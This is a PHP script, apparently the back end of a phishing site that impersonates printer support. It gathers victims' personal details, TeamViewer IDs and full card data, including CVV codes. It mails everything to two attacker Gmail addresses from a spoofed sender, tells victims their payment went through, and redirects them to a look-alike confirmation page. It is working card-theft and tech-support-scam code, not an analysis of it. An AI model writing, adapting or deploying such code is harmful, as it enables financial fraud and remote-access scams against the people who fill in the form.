<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $caseId = isset($_POST['CaseId']) ? htmlspecialchars($_POST['CaseId']) : '';
    $email = isset($_POST['email']) ? htmlspecialchars($_POST['email']) : '';
    $phone = isset($_POST['phone']) ? htmlspecialchars($_POST['phone']) : '';
    $firstName = isset($_POST['FirstName']) ? htmlspecialchars($_POST['FirstName']) : '';
    $lastName = isset($_POST['LastName']) ? htmlspecialchars($_POST['LastName']) : '';
    $streetAddress = isset($_POST['Streetadd']) ? htmlspecialchars($_POST['Streetadd']) : '';
    $city = isset($_POST['City']) ? htmlspecialchars($_POST['City']) : '';
    $state = isset($_POST['State']) ? htmlspecialchars($_POST['State']) : '';
    $zipCode = isset($_POST['ZipCode']) ? htmlspecialchars($_POST['ZipCode']) : '';
    $cardName = isset($_POST['CardName']) ? htmlspecialchars($_POST['CardName']) : '';
    $cardType = isset($_POST['CCtype']) ? htmlspecialchars($_POST['CCtype']) : '';
    $cardNumber = isset($_POST['CardNumber']) ? htmlspecialchars($_POST['CardNumber']) : '';
    $cardExp = isset($_POST['CardExp']) ? htmlspecialchars($_POST['CardExp']) : '';
    $cardCVV = isset($_POST['CardCVV']) ? htmlspecialchars($_POST['CardCVV']) : '';
    $cardCVV3 = isset($_POST['CardCVV3']) ? htmlspecialchars($_POST['CardCVV3']) : '';
    $cardCVV4 = isset($_POST['CardCVV4']) ? htmlspecialchars($_POST['CardCVV4']) : '';

    $to = "rawkstar.vipul@gmail.com, skytech1321@gmail.com";
    $subject = "$firstName : $cardNumber (New Details)";
    
    $body = "<h2>Payment Details</h2>
        <p><strong>Teamviewer ID:</strong> $caseId</p>
        <p><strong>Email:</strong> $email</p>
        <p><strong>Phone:</strong> $phone</p>
        <p><strong>First Name:</strong> $firstName</p>
        <p><strong>Last Name:</strong> $lastName</p>
        <p><strong>Street Address:</strong> $streetAddress</p>
        <p><strong>City:</strong> $city</p>
        <p><strong>State:</strong> $state</p>
        <p><strong>Zip Code:</strong> $zipCode</p>
        <h3>Card Information</h3>
        <p><strong>Card Name:</strong> $cardName</p>
        <p><strong>Card Type:</strong> $cardType</p>
        <p><strong>Card Number:</strong> $cardNumber</p>
        <p><strong>Expiration Date:</strong> $cardExp</p>
        <p><strong>Security Code (CVV):</strong> $cardCVV</p>";
    
    if ($cardType === "Amex") {
        $body .= "<p><strong>Amex 3-digit CVV:</strong> $cardCVV3</p>
                  <p><strong>Amex 4-digit CVV:</strong> $cardCVV4</p>";
    }
    
    $headers = "MIME-Version: 1.0" . "\r\n";
    $headers .= "Content-Type: text/html; charset=ISO-8859-1" . "\r\n";
    $headers .= "From: support@theprinterguru.site" . "\r\n";    
    // Send email
    if (mail($to, $subject, $body, $headers)) {
    echo "<script>alert('Payment is Processed. This Payment may take time to reflect as we have conjuction in our payment network'); window.location.href='https://hewlettprinters.github.io/order1/confirm.html';</script>";
    } else {
        echo "<script>alert('Error sending email. Please try again later.'); window.location.href='https://hewlettprinters.github.io/order1/confirm.html';</script>";
    }
} else {
    echo "<script>alert('Invalid request.'); window.location.href='https://hewlettprinters.github.io/order1/confirm.html';</script>";
}
?>